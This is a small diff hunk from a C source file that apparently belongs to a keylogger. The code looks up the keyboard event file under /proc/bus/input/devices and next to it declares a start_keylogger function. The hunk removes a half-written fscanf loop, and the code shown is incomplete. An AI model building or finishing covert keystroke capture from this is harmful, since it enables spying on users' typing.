@@ -15,8 +15,6 @@ char *get_event_file() {
 		printf("[ERROR] Couldn't open /proc/bus/input/devices\n");
 		exit(-1);
 	}
-
-	while (fscanf(fptr, // I need more practice
 }
 
 int start_keylogger() {
